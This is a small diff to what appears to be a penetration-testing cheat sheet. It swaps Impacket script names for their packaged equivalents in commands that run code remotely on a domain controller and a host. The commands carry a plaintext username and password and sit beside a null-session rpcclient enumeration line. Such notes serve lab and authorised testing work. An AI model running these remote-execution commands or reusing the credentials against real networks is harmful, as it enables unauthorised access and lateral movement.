@@ -51,11 +51,11 @@ rpcclient -U "" -N {{DC_IP}}
 ```
 
 ```bash
-psexec.py {{DOMAIN}}/wley:'transporter@4'@172.16.5.125
+impacket-psexec {{DOMAIN}}/wley:'transporter@4'@172.16.5.125
 ```
 
 ```bash
-wmiexec.py {{DOMAIN}}/wley:'transporter@4'@{{DC_IP}}
+impacket-wmiexec {{DOMAIN}}/wley:'transporter@4'@{{DC_IP}}
 ```
 
 ```bash
